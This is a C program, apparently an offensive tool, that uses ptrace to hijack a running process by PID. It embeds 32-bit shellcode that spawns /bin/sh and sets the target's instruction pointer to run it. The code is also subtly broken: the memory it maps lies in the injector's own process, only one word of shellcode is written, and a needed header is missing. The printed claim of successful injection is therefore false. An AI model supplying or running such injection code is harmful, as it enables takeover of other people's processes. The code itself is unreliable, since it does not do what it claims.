#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

// Simple shellcode for /bin/sh
unsigned char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    // Attach to the target process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace(ATTACH)");
        exit(1);
    }
    wait(NULL); // Wait for the process to stop

    // Allocate memory in the target process
    void *remote_mem = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (remote_mem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    // Write shellcode to the target process
    if (ptrace(PTRACE_POKETEXT, pid, remote_mem, *(long *)shellcode) < 0) {
        perror("ptrace(POKETEXT)");
        exit(1);
    }

    // Set the instruction pointer to the injected shellcode
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(GETREGS)");
        exit(1);
    }
    regs.eip = (long)remote_mem; // Set EIP to the shellcode address
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        exit(1);
    }

    // Detach from the target process
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
        perror("ptrace(DETACH)");
        exit(1);
    }

    printf("Shellcode injected and executed in process %d\n", pid);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]); // Target process ID
    inject_shellcode(pid, shellcode, sizeof(shellcode));

    return 0;
}
